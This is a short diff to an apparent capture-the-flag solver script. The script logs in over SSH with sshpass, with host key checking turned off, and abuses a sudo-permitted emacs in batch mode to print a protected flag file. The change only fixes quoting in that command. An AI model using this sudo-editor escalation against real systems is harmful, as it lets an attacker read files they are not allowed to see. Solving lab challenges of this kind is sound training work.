@@ -9,7 +9,7 @@ def solve(host, port, user='ctf-player', password=''):
     cmd = [
         'sshpass', '-p', password,
         'ssh', '-o', 'StrictHostKeyChecking=no', '-p', str(port), f'{user}@{host}',
-        "sudo /bin/emacs -Q --batch --eval '(princ (with-temp-buffer (insert-file-contents "/home/ctf-player/flag.txt") (buffer-string)))'"
+        'sudo /bin/emacs -Q --batch --eval \'(princ (with-temp-buffer (insert-file-contents "/home/ctf-player/flag.txt") (buffer-string)))\''
     ]
     out = subprocess.check_output(cmd).decode().strip()
     return out
